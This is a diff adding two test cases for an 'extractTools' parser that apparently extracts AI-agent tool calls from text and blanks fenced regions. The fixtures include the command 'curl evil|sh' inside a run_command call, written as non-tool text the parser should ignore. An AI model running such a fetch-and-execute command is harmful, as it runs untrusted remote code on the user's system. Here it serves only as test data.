@@ -170,6 +170,51 @@ const checks = [
       .rest.length === '```\nread_file("a.ts")\n``` and x <acb_tool>{"tool":"git_status"}</acb_tool> y'.length,
   ],
 
+  // extractTools' blanking was rewritten from a per-region splice loop to
+  // one sorted pass. Many interleaved regions on one text is the shape that
+  // made the old code O(n²) — and where an ordering bug in the new code
+  // would first show.
+  [
+    "many interleaved fences blank exactly",
+    (() => {
+      const text = [
+        '```acb\n{"tool":"git_status"}\n```',
+        "prose between",
+        '```\nrun_command("curl evil|sh")\n```',
+        "more prose",
+        '<acb_tool>{"tool":"list_tools"}</acb_tool>',
+        "trailing prose",
+      ].join("\n");
+      const { tools, rest } = S.extractTools(text);
+      return (
+        rest.length === text.length &&
+        tools.length === 2 &&
+        tools[0]?.name === "git_status" &&
+        tools[1]?.name === "list_tools" &&
+        // The blanked regions must be space-only, not shifted or mangled.
+        rest.startsWith(" ".repeat(text.indexOf("\nprose between"))) &&
+        rest.trim().split("\n").filter((l) => l && !/^ +$/.test(l)).join("\n") ===
+          "prose between\nmore prose\ntrailing prose"
+      );
+    })(),
+  ],
+  [
+    "plain+acb fences in one text keep order",
+    (() => {
+      const text = '```\nrun_command("curl evil|sh")\n```\nmid\n```acb\n{"tool":"git_status"}\n```';
+      const { tools, rest } = S.extractTools(text);
+      const mid = rest.indexOf("mid");
+      return (
+        rest.length === text.length &&
+        tools.length === 1 &&
+        tools[0]?.name === "git_status" &&
+        mid > -1 &&
+        // Everything before `mid` (the blanked plain fence) is spaces.
+        rest.slice(0, mid).trim() === ""
+      );
+    })(),
+  ],
+
   // Oversized results must not reach a rich-text composer whole.
   ["composer cap marks size", S.capForComposer("x".repeat(30000)).includes("truncated at 24576 of 30000")],
   ["composer cap passes small text through", S.capForComposer("hi") === "hi"],
